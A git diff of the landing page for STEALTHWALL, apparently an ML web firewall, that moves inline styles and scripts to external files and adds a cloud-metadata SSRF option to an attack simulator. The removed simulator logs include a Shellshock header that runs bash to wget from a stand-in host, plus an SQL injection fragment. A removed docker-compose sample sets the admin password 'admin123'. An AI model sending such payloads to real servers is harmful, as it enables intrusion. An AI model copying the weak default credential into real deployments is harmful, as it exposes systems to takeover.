@@ -4,522 +4,31 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>STEALTHWALL — Sub-Millisecond ML Intrusion Prevention System & WAF</title>
-  <meta name="description" content="Next-Gen self-hosted ML intrusion prevention system and Web Application Firewall. Evaluates sliding-window behavioral features in sub-millisecond time with graduated defense.">
+  <meta name="description" content="Next-Gen self-hosted ML intrusion prevention system and Web Application Firewall. Evaluates sliding-window behavioral entropy in sub-millisecond time with graduated defense.">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  
-  <style>
-    :root {
-      --bg: #060913;
-      --bg-surface: #0c1222;
-      --bg-card: #111a30;
-      --card-border: rgba(59, 130, 246, 0.15);
-      --card-border-hover: rgba(59, 130, 246, 0.4);
-      --text: #f8fafc;
-      --text-muted: #94a3b8;
-      --text-dim: #64748b;
-      --primary: #3b82f6;
-      --primary-glow: rgba(59, 130, 246, 0.35);
-      --accent-cyan: #06b6d4;
-      --accent-purple: #8b5cf6;
-      --danger: #ef4444;
-      --warning: #f59e0b;
-      --success: #10b981;
-      --code-bg: #070c18;
-    }
-
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    html { scroll-behavior: smooth; }
-    body {
-      font-family: 'Plus Jakarta Sans', -apple-system, sans-serif;
-      background-color: var(--bg);
-      color: var(--text);
-      line-height: 1.6;
-      overflow-x: hidden;
-      background-image: 
-        radial-gradient(circle at 50% 0%, rgba(59, 130, 246, 0.12) 0%, transparent 60%),
-        radial-gradient(circle at 10% 40%, rgba(6, 182, 212, 0.08) 0%, transparent 40%),
-        radial-gradient(circle at 90% 70%, rgba(139, 92, 246, 0.08) 0%, transparent 50%);
-    }
-
-    /* Typography & Utilities */
-    .mono { font-family: 'JetBrains Mono', monospace; }
-    .container { max-width: 1200px; margin: 0 auto; padding: 0 1.5rem; }
-    .gradient-text {
-      background: linear-gradient(135deg, #60a5fa 0%, #38bdf8 50%, #c084fc 100%);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    .badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.4rem;
-      padding: 0.35rem 0.85rem;
-      border-radius: 9999px;
-      font-size: 0.8125rem;
-      font-weight: 600;
-      background: rgba(59, 130, 246, 0.1);
-      border: 1px solid rgba(59, 130, 246, 0.3);
-      color: #93c5fd;
-    }
-    .badge-dot {
-      width: 6px;
-      height: 6px;
-      border-radius: 50%;
-      background: #10b981;
-      box-shadow: 0 0 8px #10b981;
-      animation: pulse 2s infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { opacity: 1; transform: scale(1); }
-      50% { opacity: 0.5; transform: scale(1.3); }
-    }
-
-    /* Navigation */
-    nav {
-      position: sticky;
-      top: 0;
-      z-index: 50;
-      backdrop-filter: blur(16px);
-      background: rgba(6, 9, 19, 0.8);
-      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-    }
-    .nav-inner {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      height: 72px;
-    }
-    .brand {
-      display: flex;
-      align-items: center;
-      gap: 0.75rem;
-      font-weight: 800;
-      font-size: 1.25rem;
-      text-decoration: none;
-      color: #fff;
-    }
-    .brand-logo {
-      width: 32px;
-      height: 32px;
-      background: linear-gradient(135deg, #3b82f6, #06b6d4);
-      border-radius: 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: 900;
-      font-size: 1.1rem;
-      box-shadow: 0 0 15px rgba(59, 130, 246, 0.5);
-    }
-    .nav-links {
-      display: flex;
-      align-items: center;
-      gap: 2rem;
-      list-style: none;
-    }
-    .nav-links a {
-      color: var(--text-muted);
-      text-decoration: none;
-      font-size: 0.9375rem;
-      font-weight: 500;
-      transition: color 0.2s;
-    }
-    .nav-links a:hover { color: #fff; }
-    .nav-btn {
-      background: rgba(59, 130, 246, 0.15);
-      border: 1px solid rgba(59, 130, 246, 0.4);
-      color: #fff;
-      padding: 0.5rem 1.25rem;
-      border-radius: 0.5rem;
-      text-decoration: none;
-      font-weight: 600;
-      font-size: 0.875rem;
-      transition: all 0.2s;
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-    }
-    .nav-btn:hover {
-      background: var(--primary);
-      box-shadow: 0 0 20px var(--primary-glow);
-    }
-
-    /* Hero Section */
-    .hero {
-      padding: 5rem 0 4rem;
-      text-align: center;
-    }
-    .hero h1 {
-      font-size: 3.5rem;
-      font-weight: 800;
-      letter-spacing: -0.03em;
-      line-height: 1.15;
-      margin: 1.5rem 0 1.25rem;
-    }
-    .hero p {
-      font-size: 1.25rem;
-      color: var(--text-muted);
-      max-width: 760px;
-      margin: 0 auto 2.5rem;
-    }
-    .hero-actions {
-      display: flex;
-      justify-content: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-      margin-bottom: 2.5rem;
-    }
-    .btn-primary {
-      background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
-      color: #fff;
-      padding: 0.875rem 2rem;
-      border-radius: 0.625rem;
-      font-weight: 700;
-      font-size: 1rem;
-      text-decoration: none;
-      transition: all 0.2s;
-      box-shadow: 0 4px 20px rgba(59, 130, 246, 0.4);
-      display: inline-flex;
-      align-items: center;
-      gap: 0.5rem;
-    }
-    .btn-primary:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 30px rgba(59, 130, 246, 0.6);
-    }
-    .btn-secondary {
-      background: var(--bg-surface);
-      border: 1px solid var(--card-border);
-      color: #f1f5f9;
-      padding: 0.875rem 2rem;
-      border-radius: 0.625rem;
-      font-weight: 600;
-      font-size: 1rem;
-      text-decoration: none;
-      transition: all 0.2s;
-    }
-    .btn-secondary:hover {
-      background: var(--bg-card);
-      border-color: rgba(255, 255, 255, 0.2);
-    }
-
-    /* Install Pill Switcher */
-    .install-bar {
-      display: inline-flex;
-      background: var(--code-bg);
-      border: 1px solid var(--card-border);
-      border-radius: 0.75rem;
-      padding: 0.5rem 1rem;
-      align-items: center;
-      gap: 1.25rem;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-    }
-    .install-cmd {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 0.9375rem;
-      color: #38bdf8;
-    }
-    .copy-btn {
-      background: rgba(255, 255, 255, 0.08);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      color: var(--text-muted);
-      padding: 0.35rem 0.75rem;
-      border-radius: 0.375rem;
-      font-size: 0.75rem;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.2s;
-    }
-    .copy-btn:hover { background: rgba(255, 255, 255, 0.2); color: #fff; }
-
-    /* Interactive Live Simulator Section */
-    .simulator-section {
-      padding: 5rem 0;
-    }
-    .section-title {
-      text-align: center;
-      margin-bottom: 3.5rem;
-    }
-    .section-title h2 {
-      font-size: 2.25rem;
-      font-weight: 800;
-      letter-spacing: -0.02em;
-      margin-bottom: 0.75rem;
-    }
-    .section-title p {
-      color: var(--text-muted);
-      font-size: 1.125rem;
-    }
-
-    .sim-card {
-      background: var(--bg-surface);
-      border: 1px solid var(--card-border);
-      border-radius: 1rem;
-      padding: 2rem;
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
-    }
-    .sim-controls {
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-      margin-bottom: 1.5rem;
-      padding-bottom: 1.5rem;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
-    }
-    .sim-select {
-      background: var(--bg-card);
-      border: 1px solid var(--card-border);
-      color: #fff;
-      padding: 0.75rem 1rem;
-      border-radius: 0.5rem;
-      font-family: inherit;
-      font-size: 0.9375rem;
-      font-weight: 600;
-      flex: 1;
-      min-width: 260px;
-    }
-    .sim-fire-btn {
-      background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
-      color: #fff;
-      border: none;
-      border-radius: 0.5rem;
-      padding: 0.75rem 1.75rem;
-      font-weight: 700;
-      font-size: 0.9375rem;
-      cursor: pointer;
-      box-shadow: 0 4px 15px rgba(239, 68, 68, 0.4);
-      transition: all 0.2s;
-    }
-    .sim-fire-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 25px rgba(239, 68, 68, 0.6);
-    }
-
-    .sim-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 1.5rem;
-    }
-    @media (max-width: 860px) {
-      .sim-grid { grid-template-columns: 1fr; }
-      .hero h1 { font-size: 2.5rem; }
-    }
-
-    .sim-metric-box {
-      background: var(--bg-card);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: 0.75rem;
-      padding: 1.25rem;
-    }
-    .sim-metric-title {
-      font-size: 0.8125rem;
-      font-weight: 600;
-      color: var(--text-dim);
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-      margin-bottom: 0.5rem;
-    }
-    .sim-metric-val {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 1.5rem;
-      font-weight: 700;
-      color: #fff;
-    }
-    .sim-log-terminal {
-      background: var(--code-bg);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: 0.75rem;
-      padding: 1.25rem;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 0.8125rem;
-      height: 240px;
-      overflow-y: auto;
-      color: #cbd5e1;
-    }
-    .sim-log-entry { margin-bottom: 0.35rem; }
-    .sim-log-entry.block { color: #f87171; font-weight: bold; }
-    .sim-log-entry.ml { color: #38bdf8; }
-    .sim-log-entry.pass { color: #4ade80; }
-
-    /* Features Grid */
-    .features-section {
-      padding: 5rem 0;
-    }
-    .grid-3 {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-      gap: 2rem;
-    }
-    .feature-card {
-      background: var(--bg-surface);
-      border: 1px solid var(--card-border);
-      border-radius: 1rem;
-      padding: 2.25rem;
-      transition: all 0.3s;
-      position: relative;
-    }
-    .feature-card:hover {
-      transform: translateY(-4px);
-      border-color: var(--card-border-hover);
-      box-shadow: 0 15px 35px rgba(59, 130, 246, 0.1);
-    }
-    .feature-icon {
-      width: 50px;
-      height: 50px;
-      background: rgba(59, 130, 246, 0.15);
-      border: 1px solid rgba(59, 130, 246, 0.3);
-      border-radius: 12px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.5rem;
-      margin-bottom: 1.25rem;
-    }
-    .feature-card h3 {
-      font-size: 1.25rem;
-      font-weight: 700;
-      margin-bottom: 0.75rem;
-      color: #fff;
-    }
-    .feature-card p {
-      color: var(--text-muted);
-      font-size: 0.9375rem;
-      line-height: 1.6;
-    }
-
-    /* Comparison Table */
-    .comparison-section {
-      padding: 5rem 0;
-    }
-    .table-card {
-      background: var(--bg-surface);
-      border: 1px solid var(--card-border);
-      border-radius: 1rem;
-      overflow: hidden;
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
-    }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      text-align: left;
-    }
-    th, td {
-      padding: 1.25rem 1.5rem;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-      font-size: 0.9375rem;
-    }
-    th {
-      background: rgba(255, 255, 255, 0.02);
-      font-weight: 700;
-      color: #fff;
-      font-size: 0.875rem;
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-    }
-    td:first-child { font-weight: 600; color: #fff; }
-    .col-highlight {
-      background: rgba(59, 130, 246, 0.08);
-      font-weight: 700;
-      color: #60a5fa;
-    }
-    th.col-highlight { background: rgba(59, 130, 246, 0.15); color: #93c5fd; }
-
-    /* Code Tabs Section */
-    .code-section {
-      padding: 5rem 0;
-    }
-    .code-card {
-      background: var(--code-bg);
-      border: 1px solid var(--card-border);
-      border-radius: 1rem;
-      overflow: hidden;
-    }
-    .code-tabs {
-      display: flex;
-      background: rgba(255, 255, 255, 0.03);
-      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-      overflow-x: auto;
-    }
-    .code-tab {
-      padding: 1rem 1.5rem;
-      background: transparent;
-      border: none;
-      color: var(--text-muted);
-      font-family: inherit;
-      font-size: 0.875rem;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.2s;
-      border-bottom: 2px solid transparent;
-      white-space: nowrap;
-    }
-    .code-tab.active {
-      color: #60a5fa;
-      border-bottom-color: #3b82f6;
-      background: rgba(59, 130, 246, 0.05);
-    }
-    .code-content {
-      padding: 1.75rem;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 0.875rem;
-      line-height: 1.7;
-      color: #e2e8f0;
-      overflow-x: auto;
-    }
-    .code-content pre { margin: 0; }
-
-    /* Footer */
-    footer {
-      border-top: 1px solid rgba(255, 255, 255, 0.06);
-      padding: 4rem 0 2rem;
-      background: #04060d;
-      color: var(--text-dim);
-    }
-    .footer-grid {
-      display: grid;
-      grid-template-columns: 2fr 1fr 1fr 1fr;
-      gap: 3rem;
-      margin-bottom: 3rem;
-    }
-    @media (max-width: 768px) {
-      .footer-grid { grid-template-columns: 1fr; }
-    }
-    .footer-links { list-style: none; }
-    .footer-links li { margin-bottom: 0.75rem; }
-    .footer-links a { color: var(--text-muted); text-decoration: none; font-size: 0.9375rem; transition: color 0.2s; }
-    .footer-links a:hover { color: #fff; }
-    .footer-bottom {
-      border-top: 1px solid rgba(255, 255, 255, 0.04);
-      padding-top: 2rem;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      flex-wrap: wrap;
-      gap: 1rem;
-      font-size: 0.875rem;
-    }
-  </style>
+  <link rel="stylesheet" href="assets/css/style.css">
 </head>
 <body>
 
   <!-- Navigation -->
   <nav>
     <div class="container nav-inner">
-      <a href="#" class="brand">
+      <a href="index.html" class="brand">
         <div class="brand-logo">S</div>
         <span>STEALTHWALL</span>
         <span class="badge mono">v5.0.0</span>
       </a>
       <ul class="nav-links">
-        <li><a href="#simulator">Live Simulator</a></li>
-        <li><a href="#how-it-works">How It Works</a></li>
-        <li><a href="#comparison">Benchmarks</a></li>
-        <li><a href="#integrations">Integrations</a></li>
+        <li><a href="index.html" class="active">Home</a></li>
+        <li><a href="how-it-works.html">How It Works</a></li>
+        <li><a href="demo.html">Live Sandbox</a></li>
+        <li><a href="integrations.html">Integrations</a></li>
+        <li><a href="benchmarks.html">Benchmarks</a></li>
+        <li><a href="about.html">About</a></li>
       </ul>
-      <div style="display: flex; gap: 0.75rem;">
+      <div class="nav-cta">
         <a href="https://github.com/CSV0ID/STEALTHWALL" target="_blank" class="nav-btn">
           <span>GitHub</span> ⭐
         </a>
@@ -540,13 +49,13 @@
       <p>Self-hosted intelligent Web Application Firewall and IPS. Evaluates sliding-window behavioral entropy across 14 statistical features in sub-millisecond time with LightGBM ONNX inference and automated graduated defense.</p>
 
       <div class="hero-actions">
-        <a href="#integrations" class="btn-primary">Get Started in 1 Minute →</a>
-        <a href="#simulator" class="btn-secondary">Test Attack Simulator ⚡</a>
+        <a href="integrations.html" class="btn-primary">Get Started in 1 Minute →</a>
+        <a href="demo.html" class="btn-secondary">Test Attack Sandbox ⚡</a>
       </div>
 
       <div class="install-bar mono">
-        <span style="color: #64748b;"># Install Python SDK:</span>
-        <span class="install-cmd" id="installCmd">pip install stealthwall</span>
+        <span style="color: #64748b;"># Python:</span>
+        <span class="install-cmd">pip install stealthwall</span>
         <button class="copy-btn" onclick="copyInstall('pip install stealthwall')">Copy</button>
         <span style="color: #64748b;">|</span>
         <span style="color: #64748b;"># Node.js:</span>
@@ -573,6 +82,7 @@
             <option value="nikto">Nikto Web Vulnerability Scanner (404 directory sweep)</option>
             <option value="wpscan">WPScan XML-RPC Password Brute Force (High frequency)</option>
             <option value="commix">Commix Command Injection (Malformed header tampering)</option>
+            <option value="zday_ssrf">Zero-Day Cloud Metadata SSRF Probe (169.254.169.254)</option>
             <option value="benign">Legitimate Benign User (Human browsing traffic)</option>
           </select>
           <button class="sim-fire-btn" onclick="runAttackSim()">Fire Simulated Traffic 🚀</button>
@@ -609,13 +119,13 @@
     </div>
   </section>
 
-  <!-- How It Works Section -->
-  <section class="features-section" id="how-it-works">
+  <!-- Core Features Grid -->
+  <section class="features-section">
     <div class="container">
       <div class="section-title">
-        <div class="badge" style="margin-bottom: 0.75rem;">Architecture</div>
-        <h2>How STEALTHWALL Defends Your System</h2>
-        <p>Four-stage zero-latency defense pipeline designed for high-concurrency production backends.</p>
+        <div class="badge" style="margin-bottom: 0.75rem;">Enterprise Defense</div>
+        <h2>Engineered for High-Concurrency Backends</h2>
+        <p>Complete defense-in-depth across network, behavioral analysis, and edge synchronization layers.</p>
       </div>
 
       <div class="grid-3">
@@ -652,14 +162,14 @@
         <div class="feature-card">
           <div class="feature-icon">📊</div>
           <h3>6. Real-Time SOC Console</h3>
-          <p>Live WebSocket streaming console (<code>/ws/feed</code>), Prometheus metric exporter (<code>/metrics</code>), and sound-alerting incident stream for security operations.</p>
+          <p>Live WebSocket streaming console (<code>/ws/feed</code>), Prometheus metric exporter (<code>/metrics</code>), and persistent SQLite incident logging for security operations.</p>
         </div>
       </div>
     </div>
   </section>
 
-  <!-- Benchmarks & Comparison Section -->
-  <section class="comparison-section" id="comparison">
+  <!-- Technical Superiority Table -->
+  <section class="comparison-section">
     <div class="container">
       <div class="section-title">
         <div class="badge" style="margin-bottom: 0.75rem;">Technical Superiority</div>
@@ -727,8 +237,8 @@
     </div>
   </section>
 
-  <!-- 1-Line Integrations Section -->
-  <section class="code-section" id="integrations">
+  <!-- 1-Line Drop-in Integrations -->
+  <section class="code-section">
     <div class="container">
       <div class="section-title">
         <div class="badge" style="margin-bottom: 0.75rem;">Universal SDK</div>
@@ -791,12 +301,13 @@ StealthWall(app)  <span style="color: #64748b;"># That's it! Full ML WAF & kerne
         </div>
 
         <div>
-          <h4 style="color: #fff; font-size: 0.9375rem; margin-bottom: 1rem;">Documentation</h4>
+          <h4 style="color: #fff; font-size: 0.9375rem; margin-bottom: 1rem;">Navigation</h4>
           <ul class="footer-links">
-            <li><a href="https://github.com/CSV0ID/STEALTHWALL/blob/main/docs/API_REFERENCE.md" target="_blank">API Reference</a></li>
-            <li><a href="https://github.com/CSV0ID/STEALTHWALL/blob/main/docs/INTEGRATION_PYTHON.md" target="_blank">Python Guide</a></li>
-            <li><a href="https://github.com/CSV0ID/STEALTHWALL/blob/main/docs/INTEGRATION_NODEJS.md" target="_blank">Node.js Guide</a></li>
-            <li><a href="https://github.com/CSV0ID/STEALTHWALL/blob/main/docs/ATTACK_SIMULATION_GUIDE.md" target="_blank">Pentesting Manual</a></li>
+            <li><a href="how-it-works.html">How It Works</a></li>
+            <li><a href="demo.html">Live Sandbox</a></li>
+            <li><a href="integrations.html">Integrations Hub</a></li>
+            <li><a href="benchmarks.html">Benchmarks & Research</a></li>
+            <li><a href="about.html">About & Security</a></li>
           </ul>
         </div>
 
@@ -821,195 +332,6 @@ StealthWall(app)  <span style="color: #64748b;"># That's it! Full ML WAF & kerne
     </div>
   </footer>
 
-  <script>
-    // Copy helper
-    function copyInstall(text) {
-      navigator.clipboard.writeText(text);
-      alert('Copied to clipboard: ' + text);
-    }
-
-    // Interactive Code Switcher
-    const codeSnippets = {
-      python: `<pre><code style="color: #60a5fa;"># 1. Install from PyPI</code>
-pip install stealthwall
-
-<code style="color: #60a5fa;"># 2. Add to your FastAPI app</code>
-<span style="color: #c084fc;">from</span> fastapi <span style="color: #c084fc;">import</span> FastAPI
-<span style="color: #c084fc;">from</span> stealthwall <span style="color: #c084fc;">import</span> StealthWall
-
-app = FastAPI()
-StealthWall(app)  <span style="color: #64748b;"># That's it! Full ML WAF & kernel protection is now active.</span>
-
-<span style="color: #38bdf8;">@app.get</span>(<span style="color: #a7f3d0;">"/api/data"</span>)
-<span style="color: #c084fc;">def</span> <span style="color: #93c5fd;">get_data</span>():
-    <span style="color: #c084fc;">return</span> {<span style="color: #a7f3d0;">"status"</span>: <span style="color: #a7f3d0;">"secure"</span>}</pre>`,
-      node: `<pre><code style="color: #60a5fa;">// 1. Install from npm</code>
-npm install stealthwall
-
-<code style="color: #60a5fa;">// 2. Add to your Express server</code>
-<span style="color: #c084fc;">const</span> express = <span style="color: #38bdf8;">require</span>(<span style="color: #a7f3d0;">'express'</span>);
-<span style="color: #c084fc;">const</span> { stealthwall } = <span style="color: #38bdf8;">require</span>(<span style="color: #a7f3d0;">'stealthwall'</span>);
-
-<span style="color: #c084fc;">const</span> app = express();
-app.use(stealthwall());  <span style="color: #64748b;">// Sub-millisecond decision client active</span>
-
-app.get(<span style="color: #a7f3d0;">'/api/users'</span>, (req, res) => {
-  res.json({ status: <span style="color: #a7f3d0;">'protected'</span> });
-});
-app.listen(3000);</pre>`,
-      nextjs: `<pre><code style="color: #60a5fa;">// middleware.ts (Next.js Edge Middleware)</code>
-<span style="color: #c084fc;">import</span> { NextResponse } <span style="color: #c084fc;">from</span> <span style="color: #a7f3d0;">'next/server'</span>;
-<span style="color: #c084fc;">import</span> type { NextRequest } <span style="color: #c084fc;">from</span> <span style="color: #a7f3d0;">'next/server'</span>;
-
-<span style="color: #c084fc;">export async function</span> <span style="color: #93c5fd;">middleware</span>(req: NextRequest) {
-  <span style="color: #c084fc;">const</span> decision = <span style="color: #c084fc;">await</span> fetch(<span style="color: #a7f3d0;">'http://localhost:8000/internal/decide'</span>, {
-    method: <span style="color: #a7f3d0;">'POST'</span>,
-    body: JSON.stringify({ ip: req.ip || <span style="color: #a7f3d0;">'127.0.0.1'</span>, path: req.nextUrl.pathname, score: 0.1 })
-  }).then(r => r.json());
-
-  <span style="color: #c084fc;">if</span> (decision.action.includes(<span style="color: #a7f3d0;">'block'</span>)) {
-    <span style="color: #c084fc;">return new</span> NextResponse(<span style="color: #a7f3d0;">'403 Blocked by STEALTHWALL'</span>, { status: 403 });
-  }
-  <span style="color: #c084fc;">return</span> NextResponse.next();
-}</pre>`,
-      php: `<pre><code style="color: #60a5fa;">// In wp-config.php or index.php</code>
-<span style="color: #c084fc;">require_once</span> __DIR__ . <span style="color: #a7f3d0;">'/integrations/php/stealthwall.php'</span>;
-
-<span style="color: #64748b;">// Automatically gates all incoming GET/POST requests</span>
-<span style="color: #93c5fd;">stealthwall_guard</span>([
-    <span style="color: #a7f3d0;">'control_plane_url'</span> => <span style="color: #a7f3d0;">'http://127.0.0.1:8000/internal/decide'</span>,
-    <span style="color: #a7f3d0;">'fail_open'</span>         => <span style="color: #c084fc;">true</span>
-]);</pre>`,
-      nginx: `<pre><code style="color: #60a5fa;"># /etc/nginx/conf.d/stealthwall.conf</code>
-location / {
-    auth_request /_stealthwall_decide;
-    proxy_pass http://backend_cluster;
-}
-
-location = /_stealthwall_decide {
-    internal;
-    proxy_pass http://127.0.0.1:8000/internal/decide;
-    proxy_pass_request_body off;
-    proxy_set_header Content-Length "";
-    proxy_set_header X-Original-URI $request_uri;
-    proxy_set_header X-Real-IP $remote_addr;
-}</pre>`,
-      docker: `<pre><code style="color: #60a5fa;"># docker-compose.yml</code>
-<span style="color: #c084fc;">version:</span> <span style="color: #a7f3d0;">'3.8'</span>
-<span style="color: #c084fc;">services:</span>
-  <span style="color: #38bdf8;">stealthwall-dashboard:</span>
-    <span style="color: #c084fc;">image:</span> python:3.11-slim
-    <span style="color: #c084fc;">command:</span> pip install stealthwall && stealthwall dashboard --port 8000
-    <span style="color: #c084fc;">ports:</span>
-      - <span style="color: #a7f3d0;">"8000:8000"</span>
-    <span style="color: #c084fc;">environment:</span>
-      - STEALTHWALL_ADMIN_USER=admin
-      - STEALTHWALL_ADMIN_PASSWORD=admin123</pre>`
-    };
-
-    function showTab(tab) {
-      document.querySelectorAll('.code-tab').forEach(t => t.classList.remove('active'));
-      event.target.classList.add('active');
-      document.getElementById('codePanel').innerHTML = codeSnippets[tab];
-    }
-
-    // Live Attack Simulation Logic
-    const attackDatabase = {
-      sqlmap: {
-        score: "0.9984",
-        action: "BLOCK_HARD",
-        actionColor: "#ef4444",
-        latency: "0.41 ms",
-        iptables: "ACTIVE (1800s DROP)",
-        logs: [
-          "[INSPECT] Window: 32 requests in 3.4s from 185.220.101.5",
-          "[FEATURE] Shannon Entropy: 0.12 (High Repetition)",
-          "[FEATURE] SQL Signature Matched: ' AND (SELECT 9928 FROM ... SLEEP(5))",
-          "[LIGHTGBM] Inference Anomaly Score: 0.9984 (Very High)",
-          "[GRADUATED] Action: BLOCK_HARD (Tier 4)",
-          "[KERNEL] iptables -I INPUT -s 185.220.101.5 -j DROP (Enforced)"
-        ]
-      },
-      nikto: {
-        score: "0.8920",
-        action: "PROVISIONAL_BLOCK",
-        actionColor: "#f59e0b",
-        latency: "0.38 ms",
-        iptables: "ACTIVE (300s DROP)",
-        logs: [
-          "[INSPECT] Window: 68 requests in 4.1s to /admin, /wp-login, /.env, /config.json",
-          "[FEATURE] 404 Error Ratio: 94.1%",
-          "[FEATURE] User-Agent: Mozilla/5.00 (Nikto/2.1.6)",
-          "[LIGHTGBM] Inference Anomaly Score: 0.8920 (Scanner Detected)",
-          "[GRADUATED] Action: PROVISIONAL_BLOCK (Tier 3 Cooldown)"
-        ]
-      },
-      wpscan: {
-        score: "0.9450",
-        action: "BLOCK_HARD",
-        actionColor: "#ef4444",
-        latency: "0.45 ms",
-        iptables: "ACTIVE (1800s DROP)",
-        logs: [
-          "[INSPECT] Window: 140 POST requests in 5.0s to /xmlrpc.php",
-          "[FEATURE] Inter-arrival Variance: 0.0001 (Automated Bot Clocking)",
-          "[LIGHTGBM] Inference Anomaly Score: 0.9450 (Brute Force Anomaly)",
-          "[GRADUATED] Action: BLOCK_HARD (Tier 4 Kernel Drop)"
-        ]
-      },
-      commix: {
-        score: "0.9810",
-        action: "BLOCK_HARD",
-        actionColor: "#ef4444",
-        latency: "0.39 ms",
-        iptables: "ACTIVE (1800s DROP)",
-        logs: [
-          "[INSPECT] Request Header: User-Agent: () { :;}; /bin/bash -c 'wget http://malware.sh'",
-          "[FEATURE] Shell Metacharacter Entropy Spike: 4.89",
-          "[LIGHTGBM] Inference Anomaly Score: 0.9810 (Command Injection)",
-          "[GRADUATED] Action: BLOCK_HARD (Immediate iptables Drop)"
-        ]
-      },
-      benign: {
-        score: "0.0120",
-        action: "PASS_CLEAN",
-        actionColor: "#10b981",
-        latency: "0.29 ms",
-        iptables: "IDLE (NO BLOCK)",
-        logs: [
-          "[INSPECT] Window: 4 requests in 24s to /index, /about, /static/style.css",
-          "[FEATURE] Status Distribution: 200 OK (100%)",
-          "[FEATURE] Inter-arrival Variance: 3.84 (Natural Human Rhythm)",
-          "[LIGHTGBM] Inference Anomaly Score: 0.0120 (Normal Traffic)",
-          "[GRADUATED] Action: PASS_CLEAN (0.0ms Penalty)"
-        ]
-      }
-    };
-
-    function runAttackSim() {
-      const type = document.getElementById('attackSelect').value;
-      const data = attackDatabase[type];
-
-      document.getElementById('metricScore').textContent = data.score;
-      const actEl = document.getElementById('metricAction');
-      actEl.textContent = data.action;
-      actEl.style.color = data.actionColor;
-
-      document.getElementById('metricLatency').textContent = data.latency;
-      document.getElementById('metricIptables').textContent = data.iptables;
-
-      const logContainer = document.getElementById('simLogs');
-      logContainer.innerHTML = '';
-      data.logs.forEach((log, index) => {
-        setTimeout(() => {
-          const div = document.createElement('div');
-          div.className = 'sim-log-entry ' + (data.action.includes('BLOCK') ? 'block' : 'pass');
-          div.textContent = log;
-          logContainer.appendChild(div);
-          logContainer.scrollTop = logContainer.scrollHeight;
-        }, index * 120);
-      });
-    }
-  </script>
+  <script src="assets/js/main.js"></script>
 </body>
 </html>
